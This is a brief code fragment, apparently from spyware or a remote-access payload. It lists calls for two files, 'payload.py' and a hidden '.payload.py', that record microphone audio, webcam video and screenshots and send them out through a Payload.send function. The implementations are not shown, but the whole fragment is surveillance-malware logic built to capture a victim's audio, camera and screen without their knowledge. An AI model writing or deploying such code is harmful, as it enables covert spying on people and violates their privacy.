#for payload.py
Payload.send(Payload.recordAudio(), "audio")
Payload.send(Payload.recordCamera(), "video")
Payload.send(Payload.recordScreen(), "image")

#for .payload.py
Payload.send(Payload.recordAudio_saved(), "audio")
Payload.send(Payload.recordAudio_tmp(), "audio")
Payload.send(Payload.recordScreen_saved(), "image")
Payload.send(Payload.recordScreen_tmp(), "image")
